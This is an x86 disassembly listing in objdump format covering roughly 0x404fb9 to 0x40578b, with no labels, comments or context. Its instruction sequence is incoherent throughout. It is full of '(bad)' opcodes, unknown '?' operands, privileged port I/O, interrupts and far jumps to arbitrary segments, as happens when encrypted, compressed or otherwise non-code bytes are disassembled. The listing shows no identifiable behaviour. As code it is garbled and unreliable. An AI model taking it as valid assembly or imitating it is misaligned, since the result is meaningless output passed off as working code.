  404fb9:	jns    0x404feb
  404fbb:	xchg   ecx,eax
  404fbc:	xchg   ah,ch
  404fbe:	and    eax,0x70e0499f
  404fc3:	mov    DWORD PTR [ecx+ecx*8],esp
  404fc6:	jno    0x404f88
  404fc8:	popa   
  404fc9:	dec    esp
  404fca:	xchg   edi,eax
  404fcb:	popa   
  404fcc:	lea    edi,[ecx-0x50]
  404fcf:	stos   BYTE PTR es:[edi],al
  404fd0:	leave  
  404fd1:	mov    edx,0x6471d20b
  404fd6:	pop    ebx
  404fd7:	pop    esi
  404fd8:	jns    0x405019
  404fda:	ins    DWORD PTR es:[edi],dx
  404fdb:	xlat   BYTE PTR ds:[ebx]
  404fdc:	mov    ebp,0x1aaf5f4c
  404fe1:	test   eax,0x4969b2d
  404fe6:	int    0xa4
  404fe8:	adc    ecx,DWORD PTR [eax-0x75]
  404feb:	call   0xe2cde5a
  404ff0:	cmp    al,0x3c
  404ff2:	push   esi
  404ff3:	jl     0x404ffd
  404ff5:	idiv   BYTE PTR ds:0xc9bf81ef
  404ffb:	or     al,0xa1
  404ffd:	scas   eax,DWORD PTR es:[edi]
  404ffe:	fcomp  QWORD PTR [edi]
  405000:	inc    ebp
  405001:	adc    al,0x42
  405003:	leave  
  405004:	xchg   ecx,eax
  405005:	out    dx,al
  405006:	fdivp  st(2),st
  405008:	push   es
  405009:	inc    ebp
  40500a:	dec    esi
  40500b:	sbb    al,0x29
  40500d:	enter  0xe6c3,0x97
  405011:	xchg   ebp,edx
  405013:	cdq    
  405014:	add    DWORD PTR [ebp-0x1],edi
  405017:	fwait
  405018:	inc    esi
  405019:	(bad)  
  40501b:	shr    BYTE PTR [esp+eiz*8+0x6dee1100],0xa0
  405023:	xchg   edx,eax
  405024:	sbb    BYTE PTR [ecx-0x8],bl
  405027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405028:	push   ecx
  405029:	pushf  
  40502a:	out    0xa6,al
  40502c:	jmp    0x404fe0
  40502e:	jbe    0x40505e
  405030:	jmp    0xab35:0x58e10e18
  405037:	rcl    DWORD PTR [eax+0x41],0xd8
  40503b:	(bad)  
  40503c:	(bad)  
  40503d:	xor    BYTE PTR [edx+esi*4],al
  405040:	sti    
  405041:	push   es
  405042:	add    BYTE PTR [edx],al
  405044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405045:	or     al,0xf0
  405047:	jmp    0x4050bc
  405049:	xchg   esp,eax
  40504a:	stos   DWORD PTR es:[edi],eax
  40504b:	xor    edi,esp
  40504d:	fnstcw WORD PTR [edx+0x1325a546]
  405053:	pop    es
  405054:	inc    edx
  405055:	outs   dx,DWORD PTR ds:[esi]
  405056:	test   eax,0xda7a5649
  40505b:	fs inc eax
  40505d:	les    ecx,FWORD PTR [ebp-0x20]
  405060:	ins    DWORD PTR es:[edi],dx
  405061:	addr16 sub eax,0x609cd96d
  405067:	jle    0x405027
  405069:	lahf   
  40506a:	ja     0x4050ad
  40506c:	ins    BYTE PTR es:[edi],dx
  40506d:	push   edx
  40506e:	sub    bl,BYTE PTR [esi-0x2ceb8fe7]
  405074:	jns    0x405075
  405076:	fwait
  405077:	shl    BYTE PTR [edi-0x1f20cfd7],1
  40507d:	xchg   edi,eax
  40507e:	aaa    
  40507f:	sub    dl,BYTE PTR [ecx+0x39]
  405082:	pop    edx
  405083:	or     al,0xb8
  405085:	sbb    BYTE PTR [ebx+0x3f],dl
  405088:	adc    dl,bh
  40508a:	and    esi,DWORD PTR [ebp+0x7ef80be9]
  405090:	dec    esi
  405091:	or     al,dh
  405093:	push   0xb7d650a5
  405098:	push   esi
  405099:	mov    ebp,0x3ca588c1
  40509e:	std    
  40509f:	cmp    DWORD PTR [ecx+0x3f],edx
  4050a2:	test   al,0x4d
  4050a4:	in     eax,0x0
  4050a6:	(bad)  
  4050a8:	inc    esi
  4050a9:	adc    edi,esi
  4050ab:	add    al,0xd8
  4050ad:	or     bh,dh
  4050af:	and    ecx,DWORD PTR [esi+0x887bace]
  4050b5:	sbb    eax,0x83f25f3a
  4050ba:	mov    esp,0xb3a0c212
  4050bf:	(bad)  
  4050c0:	in     eax,dx
  4050c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050c2:	xchg   al,dl
  4050c4:	in     eax,0xbf
  4050c6:	or     eax,0x7a438654
  4050cb:	(bad)  
  4050cc:	fcom   DWORD PTR [ecx]
  4050ce:	fldl2e 
  4050d0:	call   0xc8666c73
  4050d5:	daa    
  4050d6:	fwait
  4050d7:	loop   0x405158
  4050d9:	fidiv  DWORD PTR [ebp+0x44]
  4050dc:	scas   eax,DWORD PTR es:[edi]
  4050dd:	push   esi
  4050de:	jmp    0x405129
  4050e0:	pop    ds
  4050e1:	call   0x768f:0x63f2c000
  4050e8:	sbb    esi,DWORD PTR [ecx+0xb]
  4050eb:	adc    eax,0x463684df
  4050f0:	and    BYTE PTR [esi],0xcf
  4050f3:	lea    ecx,[ebx+0x4de41d6b]
  4050f9:	pop    edi
  4050fa:	jle    0x4050bc
  4050fc:	or     BYTE PTR [edx],bh
  4050fe:	push   esp
  4050ff:	ds jo  0x4050a0
  405102:	data16 jbe 0x405178
  405105:	and    eax,0xed66ff14
  40510a:	addr16 dec eax
  40510c:	mov    ds:0x3dd55b5,al
  405111:	xchg   DWORD PTR [edi-0x25],esi
  405114:	js     0x405184
  405116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405117:	test   al,0x5b
  405119:	aaa    
  40511a:	retf   0x5d0
  40511d:	outs   dx,DWORD PTR ds:[esi]
  40511e:	mov    ecx,0x54734fc
  405123:	adc    eax,0xf
  405126:	fistp  WORD PTR [esi-0x70]
  405129:	sbb    eax,0x398524e1
  40512e:	in     al,dx
  40512f:	mov    ecx,0xbf5cd5bf
  405134:	jo     0x405157
  405136:	xchg   DWORD PTR [esi-0x21],eax
  405139:	cmp    al,0x9b
  40513b:	mov    dl,0xb8
  40513d:	ins    BYTE PTR es:[edi],dx
  40513e:	jg     0x40513e
  405140:	jno    0x4050e0
  405142:	outs   dx,DWORD PTR ds:[esi]
  405143:	fcom   QWORD PTR [ebp+0x28]
  405146:	out    0x7b,al
  405148:	mov    dh,0xc6
  40514a:	xor    ebp,DWORD PTR [ebx+ecx*1+0x320f4c4c]
  405151:	(bad)  
  405152:	mov    ch,0x88
  405154:	cs push esp
  405156:	push   ss
  405157:	(bad)  
  405158:	mov    cl,0x1d
  40515a:	clc    
  40515b:	or     BYTE PTR [esp+ebx*4-0x6b957fbe],ah
  405162:	xchg   ebx,eax
  405163:	lds    eax,FWORD PTR [ecx-0x7c]
  405166:	xchg   esp,eax
  405167:	push   ecx
  405168:	sub    bl,BYTE PTR [esi+eax*1-0x2dd0df57]
  40516f:	icebp  
  405170:	aam    0x5e
  405172:	inc    eax
  405173:	push   ds
  405174:	pop    ss
  405175:	clc    
  405176:	dec    edi
  405177:	out    dx,eax
  405178:	out    0x73,al
  40517a:	ds (bad) 
  40517c:	jno    0x4051af
  40517e:	gs xchg esp,eax
  405180:	or     al,0x60
  405182:	stos   DWORD PTR es:[edi],eax
  405183:	pop    ss
  405184:	sahf   
  405185:	mov    dl,0x98
  405187:	cmp    eax,0x4e05086a
  40518c:	mov    ebp,0xe2623408
  405191:	add    eax,0x1fe8f647
  405196:	sbb    eax,0x689d896e
  40519b:	and    edi,DWORD PTR ds:0xa1506039
  4051a1:	mov    edx,0x5f070e24
  4051a6:	push   cs
  4051a7:	enter  0xa246,0x78
  4051ab:	pop    ds
  4051ac:	mov    eax,0x1af7a8fc
  4051b1:	les    ecx,FWORD PTR [esp+edx*8]
  4051b4:	fs ret 
  4051b6:	stos   DWORD PTR es:[edi],eax
  4051b7:	dec    edi
  4051b8:	push   esp
  4051b9:	cwde   
  4051ba:	push   ds
  4051bb:	push   ds
  4051bc:	das    
  4051bd:	cdq    
  4051be:	push   edx
  4051bf:	fcmovu st,st(5)
  4051c1:	ret    0x9b6
  4051c4:	and    BYTE PTR ds:0x59adf5e9,cl
  4051ca:	scas   eax,DWORD PTR es:[edi]
  4051cb:	add    dh,BYTE PTR [esp+esi*1+0x1527bc54]
  4051d2:	scas   eax,DWORD PTR es:[edi]
  4051d3:	or     eax,0x40ac6b1a
  4051d8:	sbb    BYTE PTR [esi-0x609968a4],dh
  4051de:	push   0xf23ecde2
  4051e3:	rcr    DWORD PTR [ebx+0x5984cd2d],1
  4051e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051ea:	cli    
  4051eb:	push   0x6b
  4051ed:	nop
  4051ee:	push   cs
  4051ef:	pop    ecx
  4051f0:	jmp    0x1796:0x7cf88947
  4051f7:	lahf   
  4051f8:	pop    es
  4051f9:	sub    eax,DWORD PTR [ebx+0x49]
  4051fc:	das    
  4051fd:	imul   BYTE PTR [edi-0x54f85fc1]
  405203:	sbb    eax,0xa86a261f
  405208:	lds    ebp,FWORD PTR [ebp-0x5085ba0e]
  40520e:	or     cl,BYTE PTR [ebp+ecx*1-0x1d5f341a]
  405215:	xchg   ebx,eax
  405216:	pop    ebp
  405217:	mov    ch,0x49
  405219:	jno    0x4051b3
  40521b:	test   eax,0x62efb01e
  405220:	call   0x8382c911
  405225:	mov    edi,0xeeb80c24
  40522a:	or     DWORD PTR [ebx],edx
  40522c:	cli    
  40522d:	mov    al,ds:0x2590ec9b
  405232:	mov    dl,BYTE PTR [ecx]
  405234:	xchg   esi,eax
  405235:	jnp    0x405223
  405237:	mov    ?,WORD PTR [esi+eax*1-0x23]
  40523b:	sub    DWORD PTR [edx-0x47],eax
  40523e:	into   
  40523f:	fnstsw ax
  405241:	(bad)  
  405242:	pop    esi
  405243:	pop    esp
  405244:	push   ebx
  405245:	(bad)  
  405246:	inc    ecx
  405247:	xor    BYTE PTR [edi+eax*1-0x5a36f73b],al
  40524e:	and    ah,BYTE PTR [ebx-0x66]
  405251:	and    BYTE PTR [esi-0x3b],bh
  405254:	fwait
  405255:	xor    esp,esp
  405257:	push   ds
  405258:	daa    
  405259:	dec    ebx
  40525a:	cli    
  40525b:	jb     0x40521e
  40525d:	xchg   ebp,eax
  40525e:	nop
  40525f:	dec    esi
  405260:	lahf   
  405261:	cmc    
  405262:	jmp    0xa7c0:0x76bd1da2
  405269:	lock jge 0x405223
  40526c:	test   DWORD PTR [edi+ebp*4+0x409530a8],edx
  405273:	imul   BYTE PTR [eax+0x4]
  405276:	xor    BYTE PTR [eax-0x2225d6d3],ah
  40527c:	or     BYTE PTR [ebp+0x56],dl
  40527f:	inc    esi
  405280:	and    BYTE PTR [edi+0x4ff6afb5],al
  405286:	cdq    
  405287:	jmp    0xa2919b34
  40528c:	(bad)  
  40528d:	jnp    0x4052b9
  40528f:	xor    DWORD PTR [ebp+0x1d362394],esi
  405295:	add    eax,0x465a99ca
  40529a:	or     BYTE PTR [edx+0x13],ch
  40529d:	sti    
  40529e:	sbb    BYTE PTR [ebx-0x77d91794],ah
  4052a4:	(bad)  
  4052a6:	sar    BYTE PTR [eax+0x10],cl
  4052a9:	push   ebx
  4052aa:	mov    esi,0xbdd6a277
  4052af:	gs out dx,eax
  4052b1:	mov    DWORD PTR [edx+0x43],0x9e4b0316
  4052b8:	inc    ecx
  4052b9:	stos   DWORD PTR es:[edi],eax
  4052ba:	inc    ecx
  4052bb:	pop    edi
  4052bc:	test   eax,0xf004ad4e
  4052c1:	neg    ebp
  4052c3:	pop    ecx
  4052c4:	(bad)  
  4052c5:	pusha  
  4052c6:	lods   al,BYTE PTR ds:[esi]
  4052c7:	push   cs
  4052c8:	mov    ecx,0xe9a3b5ca
  4052cd:	mov    ebp,0xba99e735
  4052d2:	mov    ds:0xcf1b721e,eax
  4052d7:	loopne 0x4052d0
  4052d9:	mov    dh,0x78
  4052db:	out    dx,eax
  4052dc:	bound  esi,QWORD PTR [edx+0x45]
  4052df:	push   edi
  4052e0:	dec    esp
  4052e1:	or     DWORD PTR [edi+ecx*4+0x59],ebx
  4052e5:	out    dx,al
  4052e6:	inc    eax
  4052e7:	repz lea edx,[edx]
  4052ea:	stos   BYTE PTR es:[edi],al
  4052eb:	dec    eax
  4052ec:	stos   DWORD PTR es:[edi],eax
  4052ed:	test   DWORD PTR [esp+edx*2-0xcbe11ac],edi
  4052f4:	mov    dl,0xa1
  4052f6:	sub    al,0x28
  4052f8:	jns    0x405359
  4052fa:	adc    eax,0xb7e52f5c
  4052ff:	clc    
  405300:	stos   DWORD PTR es:[edi],eax
  405301:	pop    esp
  405302:	pusha  
  405303:	pusha  
  405304:	mov    ch,0x24
  405306:	inc    ecx
  405307:	mov    ebp,0x82ac2788
  40530c:	or     eax,0x2e97c827
  405311:	leave  
  405312:	ret    0x1a7
  405315:	fidivr DWORD PTR [esi-0xf665ec5]
  40531b:	dec    ebx
  40531c:	pop    ebx
  40531d:	mov    es,WORD PTR [ecx+ebx*1-0x20]
  405321:	lods   al,BYTE PTR ds:[esi]
  405322:	test   al,bh
  405324:	icebp  
  405325:	add    cl,BYTE PTR [edx-0x57]
  405328:	add    edi,DWORD PTR [ebx+edx*1+0x146b7691]
  40532f:	push   eax
  405330:	outs   dx,BYTE PTR ds:[esi]
  405331:	adc    esp,ecx
  405333:	cmp    al,BYTE PTR [edi-0x7f265676]
  405339:	inc    eax
  40533a:	popf   
  40533b:	push   cs
  40533c:	fisttp QWORD PTR [ecx-0x58645a65]
  405342:	mov    al,0x56
  405344:	ret    0x487b
  405347:	pop    es
  405348:	jl     0x4053c6
  40534a:	push   edi
  40534b:	mov    WORD PTR [edx+0x21],?
  40534e:	mov    eax,ds:0xbc33e17a
  405353:	dec    edx
  405354:	sbb    BYTE PTR [edx],bh
  405356:	or     DWORD PTR [ebx],edx
  405358:	jmp    0x93b1526c
  40535d:	inc    esi
  40535e:	add    BYTE PTR [esi+eax*2+0x1c],dh
  405362:	add    al,0x2e
  405364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405365:	std    
  405366:	mov    cl,0xce
  405368:	push   ecx
  405369:	xchg   esi,eax
  40536a:	adc    eax,0x68bc705f
  40536f:	xchg   ebp,eax
  405370:	dec    eax
  405371:	jns    0x405328
  405373:	ret    
  405374:	ins    BYTE PTR es:[edi],dx
  405375:	into   
  405376:	mov    ch,0xdd
  405378:	repz in al,0x6f
  40537b:	ficom  WORD PTR [ecx+0x4a]
  40537e:	or     eax,0xe7d0c741
  405383:	xchg   ebx,eax
  405384:	lds    ebp,FWORD PTR [ebx]
  405386:	pop    eax
  405387:	shl    DWORD PTR [esi-0x53940085],0x9b
  40538e:	inc    edx
  40538f:	repnz sub bh,dl
  405392:	mov    BYTE PTR [esi-0x49],dh
  405395:	sub    cl,BYTE PTR [eax+ecx*8-0xdca32a9]
  40539c:	cmp    BYTE PTR [ebx],ch
  40539e:	mov    al,0xc4
  4053a0:	dec    esi
  4053a1:	neg    DWORD PTR [esi]
  4053a3:	fdiv   QWORD PTR [ecx-0x2acaef07]
  4053a9:	jae    0x405424
  4053ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053ac:	xor    DWORD PTR [esi-0x59df1bb],0xffffffa5
  4053b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053b4:	adc    BYTE PTR [eax-0x59001dfd],bh
  4053ba:	ret    
  4053bb:	inc    esp
  4053bc:	aad    0xe4
  4053be:	push   ecx
  4053bf:	xchg   DWORD PTR [ecx],edi
  4053c1:	dec    ebx
  4053c2:	adc    esi,esi
  4053c4:	loopne 0x4053ea
  4053c6:	push   eax
  4053c7:	push   ebp
  4053c8:	sub    esp,0x30f3948f
  4053ce:	push   esp
  4053cf:	inc    esp
  4053d0:	(bad)  
  4053d1:	mov    bl,0xe5
  4053d3:	jl     0x4053a9
  4053d5:	inc    esp
  4053d6:	pop    es
  4053d7:	(bad)  
  4053d8:	or     BYTE PTR [esp+edi*1],dh
  4053db:	cmp    esp,eax
  4053dd:	adc    eax,0x4690e476
  4053e2:	stc    
  4053e3:	sbb    DWORD PTR [esi-0x16],ecx
  4053e6:	or     ah,BYTE PTR [ecx-0x53103e51]
  4053ec:	jmp    0x5a2e9b05
  4053f1:	mov    cl,0x73
  4053f3:	imul   ecx,DWORD PTR [eax-0x5be01c82],0x88a19640
  4053fd:	push   es
  4053fe:	pop    esi
  4053ff:	ret    
  405400:	add    DWORD PTR [esi-0x696da46a],ecx
  405406:	mov    bh,BYTE PTR [ebp+0x54ce25a3]
  40540c:	jae    0x4053d5
  40540e:	xchg   ebp,eax
  40540f:	or     eax,0xb35c134c
  405414:	repz push eax
  405416:	jnp    0x4053c6
  405418:	loopne 0x40542d
  40541a:	or     eax,DWORD PTR [ecx-0x6addd089]
  405420:	lods   eax,DWORD PTR ds:[esi]
  405421:	pop    ss
  405422:	push   ss
  405423:	div    BYTE PTR [ebx-0x37]
  405426:	and    al,0xa7
  405428:	into   
  405429:	icebp  
  40542a:	adc    BYTE PTR [ebx+0x11312ec0],bl
  405430:	repnz push ecx
  405432:	or     edi,DWORD PTR [edi-0x63d3dbf6]
  405438:	adc    al,0xd9
  40543a:	pop    ds
  40543b:	dec    ebx
  40543c:	inc    ecx
  40543d:	call   0x2167:0x1c74edd8
  405444:	xor    DWORD PTR ds:0x6d8d8a32,edi
  40544a:	dec    ebx
  40544b:	out    dx,al
  40544c:	(bad)  
  40544d:	mov    esp,0xe1247a01
  405452:	mov    bh,0x76
  405454:	cld    
  405455:	pop    ecx
  405456:	cwde   
  405457:	sbb    edi,DWORD PTR [esi+0x10]
  40545a:	dec    ebp
  40545b:	push   edx
  40545c:	pop    ds
  40545d:	lahf   
  40545e:	inc    edx
  40545f:	mov    cl,0x97
  405461:	sub    eax,0xc6b26ac3
  405466:	cli    
  405467:	add    eax,0xce83aeae
  40546c:	int3   
  40546d:	xor    eax,0x6e33e779
  405472:	hlt    
  405473:	mov    dh,0x98
  405475:	or     eax,0xa06c02a5
  40547a:	add    bl,ch
  40547c:	fisttp WORD PTR [ebx]
  40547e:	inc    esp
  40547f:	xor    dl,cl
  405481:	ja     0x4054f0
  405483:	fwait
  405484:	mov    WORD PTR [ebp+0x7e],ss
  405487:	nop
  405488:	shl    DWORD PTR [bp+si],1
  40548b:	das    
  40548c:	dec    ecx
  40548d:	dec    eax
  40548e:	es mov dl,0x31
  405491:	cmp    ebp,esp
  405493:	push   esi
  405494:	xchg   BYTE PTR [eax+eax*2],ah
  405497:	mov    dx,0xaea0
  40549b:	into   
  40549c:	pop    esi
  40549d:	push   eax
  40549e:	ja     0x405498
  4054a0:	lea    ebp,ss:[edi-0x10]
  4054a4:	jno    0x40548b
  4054a6:	mov    al,0xcd
  4054a8:	dec    esp
  4054a9:	sbb    al,0x6
  4054ab:	lock int 0x34
  4054ae:	fild   DWORD PTR [edi+edx*2-0x4ff77cb5]
  4054b5:	std    
  4054b6:	dec    eax
  4054b7:	xchg   esi,eax
  4054b8:	pop    ecx
  4054b9:	mov    dh,0x9a
  4054bb:	jno    0x4054da
  4054bd:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4054bf:	adc    ah,BYTE PTR [ebp-0xd5d2b74]
  4054c5:	mov    eax,0xd50f67d7
  4054ca:	mov    ch,0xd5
  4054cc:	inc    ebp
  4054cd:	add    DWORD PTR ds:0x7cb5fba7,esp
  4054d3:	loop   0x4054cf
  4054d5:	add    edi,ebx
  4054d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054d8:	call   0x36e:0x8a55710
  4054df:	fwait
  4054e0:	pop    ss
  4054e1:	fisubr WORD PTR [ecx-0x751e29c8]
  4054e7:	push   edx
  4054e8:	xchg   ecx,eax
  4054e9:	or     eax,0xcdc4a3b9
  4054ee:	pop    ss
  4054ef:	mov    ch,0xa9
  4054f1:	fxch   st(4)
  4054f3:	inc    eax
  4054f4:	jecxz  0x4054b5
  4054f6:	fsub   DWORD PTR [ecx+ecx*1]
  4054f9:	add    al,0x8f
  4054fb:	lods   eax,DWORD PTR ds:[esi]
  4054fc:	pop    esp
  4054fd:	cmp    edx,DWORD PTR [edx]
  4054ff:	push   cs
  405500:	setg   BYTE PTR es:[edx]
  405504:	xchg   esp,eax
  405505:	add    esp,DWORD PTR [ebp+0x179b06f2]
  40550b:	add    edi,DWORD PTR [edi]
  40550d:	xor    BYTE PTR [esi+0x4a],0xe8
  405511:	out    0x5,al
  405513:	ret    
  405514:	adc    ch,BYTE PTR [eax+0x39777826]
  40551a:	pop    edi
  40551b:	(bad)  
  40551c:	sub    ax,0x8f07
  405520:	xor    BYTE PTR [ebx],0xc5
  405523:	in     eax,0xc0
  405525:	ret    
  405526:	arpl   WORD PTR [esi+0x664672a2],di
  40552c:	mov    ah,0x3d
  40552e:	outs   dx,BYTE PTR ds:[esi]
  40552f:	iret   
  405530:	ror    BYTE PTR [ebx-0x11],0x8c
  405534:	and    DWORD PTR [edi+eax*2-0x11be702a],eax
  40553b:	dec    esp
  40553c:	add    DWORD PTR [ebx+0x2c8e8bb5],ebx
  405542:	pop    edx
  405543:	dec    esi
  405544:	push   ss
  405545:	mov    al,0x79
  405547:	dec    ebx
  405548:	fimul  DWORD PTR [esi+0x7ea614a]
  40554e:	(bad)  
  40554f:	jl     0x4055cb
  405551:	add    ebp,DWORD PTR [ecx]
  405553:	in     al,0x9e
  405555:	sub    edx,ebp
  405557:	imul   esp,DWORD PTR [eax+0x5d],0x99999d19
  40555e:	cmc    
  40555f:	test   eax,0x276ea0c1
  405564:	inc    esp
  405565:	(bad)  [edx]
  405567:	push   ebp
  405568:	js     0x40555c
  40556a:	cli    
  40556b:	dec    edi
  40556c:	stos   DWORD PTR es:[edi],eax
  40556d:	fisttp DWORD PTR [edi]
  40556f:	or     BYTE PTR [edx],bl
  405571:	arpl   WORD PTR [edi+0x11504ed2],dx
  405577:	les    ecx,FWORD PTR [ebx+0x49aeda7d]
  40557d:	(bad)  [eax-0x40]
  405580:	jbe    0x405506
  405582:	jmp    0x4055d4
  405584:	mov    bl,0x29
  405586:	jnp    0x4055e0
  405588:	arpl   ax,ax
  40558a:	ret    
  40558b:	sub    esi,ebp
  40558d:	(bad)  
  40558e:	push   0x16227aa9
  405593:	sahf   
  405594:	mov    ebp,0x2eb9b51e
  405599:	adc    al,0x14
  40559b:	cwde   
  40559c:	push   ss
  40559d:	mov    bh,0xc6
  40559f:	mov    WORD PTR [esi-0x20],?
  4055a2:	jecxz  0x405623
  4055a4:	mov    ds:0x4784d34d,al
  4055a9:	ret    
  4055aa:	(bad)  
  4055ab:	aam    0xc5
  4055ad:	sub    bl,ch
  4055af:	xchg   esp,eax
  4055b0:	mov    esi,0x5f3902f4
  4055b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055b6:	pop    ecx
  4055b7:	cs xor ebx,ebp
  4055ba:	inc    edi
  4055bb:	inc    ebp
  4055bc:	outs   dx,DWORD PTR ds:[esi]
  4055bd:	or     BYTE PTR [edi-0x16],dl
  4055c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055c1:	dec    edi
  4055c2:	mov    ?,WORD PTR [edx-0x447e855f]
  4055c8:	inc    eax
  4055c9:	jae    0x40563c
  4055cb:	(bad)  
  4055cc:	cld    
  4055cd:	mov    al,ds:0x72ca11c9
  4055d2:	sbb    DWORD PTR [esi+ecx*4-0x53],ebx
  4055d6:	mov    al,0x9b
  4055d8:	sahf   
  4055d9:	mov    cl,0xb5
  4055db:	sbb    dh,al
  4055dd:	scas   al,BYTE PTR es:[edi]
  4055de:	into   
  4055df:	sahf   
  4055e0:	cmp    eax,0x8543034b
  4055e5:	fidivr DWORD PTR [esi-0x70]
  4055e8:	mov    al,ds:0x1420df91
  4055ed:	or     esp,DWORD PTR [ecx+0x8]
  4055f0:	cdq    
  4055f1:	add    BYTE PTR [edi+0x3a],bh
  4055f4:	data16 test BYTE PTR [edi-0x3538d674],0x35
  4055fc:	lea    esi,[eax]
  4055fe:	je     0x40565e
  405600:	fsubrp st(1),st
  405602:	mov    dh,0x40
  405604:	std    
  405605:	add    al,BYTE PTR [edi]
  405607:	cdq    
  405608:	jns    0x40562c
  40560a:	inc    ebp
  40560b:	sub    ecx,DWORD PTR [esi+0x7defa9f7]
  405611:	xchg   edx,eax
  405612:	int    0xb7
  405614:	sub    BYTE PTR [ebp+0x64a8c8d2],ch
  40561a:	adc    al,0x9b
  40561c:	(bad)  
  40561d:	cmc    
  40561e:	inc    esi
  40561f:	mov    cl,0x1f
  405621:	mov    es,eax
  405623:	into   
  405624:	jo     0x405656
  405626:	dec    DWORD PTR [ebp+0x6b79ed19]
  40562c:	out    0xe7,al
  40562e:	rcl    cl,1
  405630:	mov    esi,0xd571a7ba
  405635:	js     0x405695
  405637:	cld    
  405638:	jo     0x40568f
  40563a:	xor    DWORD PTR [edx+0x3e],edx
  40563d:	mov    WORD PTR [ebx+ecx*2-0x4b1917c],?
  405644:	or     DWORD PTR [edx],ecx
  405646:	int    0x16
  405648:	fwait
  405649:	inc    esp
  40564a:	sbb    eax,0x62c207a6
  40564f:	in     al,dx
  405650:	aas    
  405651:	lea    eax,[ebx+0x6dfd872c]
  405657:	sar    BYTE PTR [eax+0x68],1
  40565a:	das    
  40565b:	and    ecx,DWORD PTR [ecx+ebx*4]
  40565e:	jecxz  0x4055e8
  405660:	cmp    ebp,DWORD PTR [eax]
  405662:	push   esi
  405663:	mov    eax,ds:0x5b64bb4c
  405668:	xor    eax,0x7362e398
  40566d:	dec    ecx
  40566e:	add    eax,0x8a5e8350
  405673:	mov    esi,0xf7a9183e
  405678:	jmp    FWORD PTR [ebx-0x12]
  40567b:	mov    dl,0xc8
  40567d:	push   cs
  40567e:	enter  0xe7ba,0x4
  405682:	arpl   WORD PTR [eax+edx*8],bp
  405685:	dec    edx
  405686:	push   eax
  405687:	popa   
  405688:	sub    DWORD PTR [eax],edi
  40568a:	cmp    DWORD PTR [eax-0x74ba1c2e],edi
  405690:	adc    al,0xc6
  405692:	xor    DWORD PTR [ecx],0xffffffb0
  405695:	jmp    0x913d3a8e
  40569a:	sahf   
  40569b:	fistp  WORD PTR [edi+ecx*2]
  40569e:	repz jnp 0x4056e6
  4056a1:	inc    ebx
  4056a2:	repz inc edx
  4056a4:	sub    DWORD PTR [eax-0x5c],edi
  4056a7:	pop    es
  4056a8:	out    0xd,al
  4056aa:	inc    eax
  4056ab:	imul   ebp,DWORD PTR [ebp-0x7c],0xffffffa1
  4056af:	dec    ecx
  4056b0:	in     eax,dx
  4056b1:	push   ebx
  4056b2:	out    0xb6,al
  4056b4:	push   ebx
  4056b5:	mov    edi,0x69706af2
  4056ba:	fs jno 0x4056e3
  4056bd:	push   ebp
  4056be:	test   ebp,esi
  4056c0:	leave  
  4056c1:	mov    esi,0xb6ef97cc
  4056c6:	and    al,0xd6
  4056c8:	cmp    bl,BYTE PTR [ecx+esi*4-0x44]
  4056cc:	push   es
  4056cd:	in     eax,dx
  4056ce:	cli    
  4056cf:	sar    DWORD PTR [esi+ecx*1],1
  4056d2:	cld    
  4056d3:	sub    BYTE PTR [ecx-0x553cc0a1],al
  4056d9:	cmp    esi,DWORD PTR [edx-0x497902e]
  4056df:	call   0xa67b:0x2207fd68
  4056e6:	call   0x8ee8:0x54413d6e
  4056ed:	mov    ch,0x65
  4056ef:	sbb    ebp,esp
  4056f1:	add    DWORD PTR [esi-0x690c669e],ebp
  4056f7:	pop    ds
  4056f8:	(bad)  
  4056f9:	iret   
  4056fa:	ins    DWORD PTR es:[edi],dx
  4056fb:	rol    BYTE PTR [edi-0x29],0x20
  4056ff:	cmc    
  405700:	and    esp,eax
  405702:	fwait
  405703:	cld    
  405704:	loop   0x40574e
  405706:	fs out 0x15,al
  405709:	daa    
  40570a:	xchg   ebx,eax
  40570b:	ins    BYTE PTR es:[edi],dx
  40570c:	retf   0xf962
  40570f:	push   ecx
  405710:	and    al,0x72
  405712:	or     DWORD PTR [eax+ebp*4-0x29],ebp
  405716:	adc    eax,0xd97479eb
  40571b:	sub    al,0x35
  40571d:	push   es
  40571e:	and    bh,BYTE PTR ds:0x924fcec0
  405724:	dec    esp
  405725:	or     BYTE PTR [edx-0x52],ah
  405728:	loop   0x4056c7
  40572a:	out    0xc1,eax
  40572c:	push   edi
  40572d:	xor    esp,0xffffffeb
  405730:	dec    ebp
  405731:	aaa    
  405732:	xlat   BYTE PTR ds:[ebx]
  405733:	add    al,0xd6
  405735:	and    BYTE PTR [ecx-0x51],bl
  405738:	bound  ebx,QWORD PTR [eax+0x4c]
  40573b:	mov    cl,0x50
  40573d:	shr    BYTE PTR [edx-0x57],0xfe
  405741:	ss ins BYTE PTR es:[edi],dx
  405743:	jmp    0x73cd:0xde9e554a
  40574a:	shr    BYTE PTR [edi+esi*1-0x5efb832e],1
  405751:	xchg   edi,eax
  405752:	push   esp
  405753:	shr    BYTE PTR [ebp+0x75],cl
  405756:	fadd   QWORD PTR [edi]
  405758:	push   edx
  405759:	enter  0xfbb6,0x5
  40575d:	repz jb 0x40577a
  405760:	outs   dx,DWORD PTR ds:[esi]
  405761:	or     dl,dl
  405763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405764:	adc    BYTE PTR ds:[eax-0x8dac4da],ch
  40576b:	push   ss
  40576c:	aad    0xfe
  40576e:	add    DWORD PTR [edi],0x1e574ff6
  405774:	nop
  405775:	sbb    esp,ecx
  405777:	(bad)  
  405778:	jns    0x40578c
  40577a:	mov    cl,BYTE PTR [ecx+0x5b70ce54]
  405780:	jno    0x405772
  405782:	push   edx
  405783:	jae    0x405766
  405785:	dec    ecx
  405786:	out    0x1b,al
  405788:	lock int3 
  40578a:	in     eax,dx
  40578b:	mov    ?,WORD PTR [ecx-0x79]
